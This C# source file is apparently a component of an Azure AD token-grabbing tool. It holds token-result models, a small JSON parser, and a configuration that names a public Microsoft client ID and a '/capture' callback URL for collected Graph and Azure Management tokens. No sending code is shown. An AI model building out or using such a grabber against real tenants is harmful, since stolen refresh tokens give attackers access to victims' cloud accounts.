using System;
using System.Collections.Generic;

namespace GrabTokenAzureAD
{
    public class TokenResult
    {
        public string AccessToken { get; set; }
        public string RefreshToken { get; set; }
        public string IdToken { get; set; }
        public string TokenType { get; set; }
        public int ExpiresIn { get; set; }
        public string Scope { get; set; }
        public string Error { get; set; }
        public string ErrorDescription { get; set; }
        public bool IsSuccess => string.IsNullOrEmpty(Error) && !string.IsNullOrEmpty(AccessToken);
        public string Resource { get; set; }
        public DateTime CapturedAt { get; set; } = DateTime.UtcNow;
        public string RawJson { get; set; }

        public static TokenResult FromJson(string json)
        {
            var result = new TokenResult { RawJson = json, CapturedAt = DateTime.UtcNow };
            var dict = SimpleJsonParser.Parse(json);

            if (dict.TryGetValue("access_token", out string accessToken))
                result.AccessToken = accessToken;
            if (dict.TryGetValue("refresh_token", out string refreshToken))
                result.RefreshToken = refreshToken;
            if (dict.TryGetValue("id_token", out string idToken))
                result.IdToken = idToken;
            if (dict.TryGetValue("token_type", out string tokenType))
                result.TokenType = tokenType;
            if (dict.TryGetValue("scope", out string scope))
                result.Scope = scope;
            if (dict.TryGetValue("error", out string error))
                result.Error = error;
            if (dict.TryGetValue("error_description", out string errorDesc))
                result.ErrorDescription = errorDesc;
            if (dict.TryGetValue("expires_in", out string expiresIn) && int.TryParse(expiresIn, out int exp))
                result.ExpiresIn = exp;

            return result;
        }
    }

    internal static class SimpleJsonParser
    {
        public static Dictionary<string, string> Parse(string json)
        {
            var result = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            if (string.IsNullOrEmpty(json)) return result;

            int i = 0;
            while (i < json.Length)
            {
                int keyStart = json.IndexOf('"', i);
                if (keyStart < 0) break;

                int keyEnd = json.IndexOf('"', keyStart + 1);
                if (keyEnd < 0) break;

                string key = json.Substring(keyStart + 1, keyEnd - keyStart - 1);

                int colon = json.IndexOf(':', keyEnd);
                if (colon < 0) break;

                int valueStart = colon + 1;
                while (valueStart < json.Length && char.IsWhiteSpace(json[valueStart]))
                    valueStart++;

                if (valueStart >= json.Length) break;

                string value;
                int valueEnd;

                if (json[valueStart] == '"')
                {
                    valueEnd = valueStart + 1;
                    while (valueEnd < json.Length)
                    {
                        if (json[valueEnd] == '\\' && valueEnd + 1 < json.Length)
                        {
                            valueEnd += 2;
                            continue;
                        }
                        if (json[valueEnd] == '"') break;
                        valueEnd++;
                    }
                    value = UnescapeString(json.Substring(valueStart + 1, valueEnd - valueStart - 1));
                    i = valueEnd + 1;
                }
                else
                {
                    valueEnd = valueStart;
                    while (valueEnd < json.Length && json[valueEnd] != ',' && json[valueEnd] != '}')
                        valueEnd++;
                    value = json.Substring(valueStart, valueEnd - valueStart).Trim();
                    i = valueEnd;
                }

                result[key] = value;
            }

            return result;
        }

        private static string UnescapeString(string s)
        {
            if (string.IsNullOrEmpty(s) || !s.Contains("\\")) return s;

            var sb = new System.Text.StringBuilder(s.Length);
            for (int i = 0; i < s.Length; i++)
            {
                if (s[i] == '\\' && i + 1 < s.Length)
                {
                    char next = s[i + 1];
                    switch (next)
                    {
                        case 'n': sb.Append('\n'); i++; break;
                        case 'r': sb.Append('\r'); i++; break;
                        case 't': sb.Append('\t'); i++; break;
                        case '"': sb.Append('"'); i++; break;
                        case '\\': sb.Append('\\'); i++; break;
                        default: sb.Append(s[i]); break;
                    }
                }
                else
                {
                    sb.Append(s[i]);
                }
            }
            return sb.ToString();
        }
    }

    public class GrabResult
    {
        public TokenResult GraphToken { get; set; }
        public TokenResult ManagementToken { get; set; }
        public string AuthorizationCode { get; set; }
        public bool Success => GraphToken?.IsSuccess == true;
        public string Error { get; set; }
    }

    public class GrabberConfig
    {
        public string ClientId { get; set; } = "1950a258-227b-4e31-a9cf-717495945fc2";
        public string Tenant { get; set; } = "common";
        public string RedirectUri { get; set; } = "http://localhost:8400";
        public string GraphScope { get; set; } = "offline_access https://graph.microsoft.com/.default";
        public string ManagementScope { get; set; } = "https://management.azure.com/.default";
        public string CallbackUrl { get; set; } = "http://192.168.1.21:8000/capture";
        public int ListenerTimeoutSeconds { get; set; } = 300;

        public string Authority => $"https://login.microsoftonline.com/{Tenant}/oauth2/v2.0";
    }
}
